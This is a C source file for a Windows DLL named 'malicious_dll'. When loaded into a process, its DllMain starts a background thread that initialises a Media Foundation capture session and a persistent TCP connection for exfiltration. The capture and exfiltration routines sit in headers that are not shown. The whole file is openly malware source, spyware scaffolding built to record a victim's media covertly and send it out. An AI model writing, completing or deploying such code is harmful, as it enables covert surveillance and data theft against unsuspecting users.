#include "malicious_dll.h"
#include "capture.h"
#include "exfiltration.h"
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <stdio.h>

// Forward declaration of the initialization thread function.
DWORD WINAPI InitializationThread(LPVOID lpParam);

// Global flag to indicate if initialization succeeded.
//static BOOL g_bInitialized = FALSE;

BOOL InitializeMaliciousDLL()
{
    // Initialize Media Foundation and start the capture session.
    if (!InitializeCaptureSession())
    {
        printf("Capture session initialization failed.\n");
        return FALSE;
    }

    // Initialize the persistent TCP connection for exfiltration.
    if (!Exfiltration_Initialize())
    {
        printf("Persistent exfiltration initialization failed.\n");
        CleanupMaliciousDLL();
        return FALSE;
    }

    printf("Malicious DLL initialized successfully.\n");
    return TRUE;
}

VOID CleanupMaliciousDLL()
{
    // Stop the capture session.
    CleanupCaptureSession();
    // Close the persistent TCP connection.
    Exfiltration_Cleanup();

    // Shutdown Media Foundation.
    MFShutdown();
    printf("Malicious DLL cleaned up successfully.\n");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread;
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Avoid thread notifications to reduce overhead.
        DisableThreadLibraryCalls(hinstDLL);
        // Spawn a separate thread to perform heavy initialization.
        hThread = CreateThread(NULL, 0, InitializationThread, NULL, 0, NULL);
        if (hThread == NULL) {
            return FALSE; // Initialization failed.
        }
        // We don't wait for the thread here.
        CloseHandle(hThread);
        break;
    case DLL_PROCESS_DETACH:
        // Perform cleanup when the process detaches.
        CleanupMaliciousDLL();
        break;
    }
    return TRUE;
}
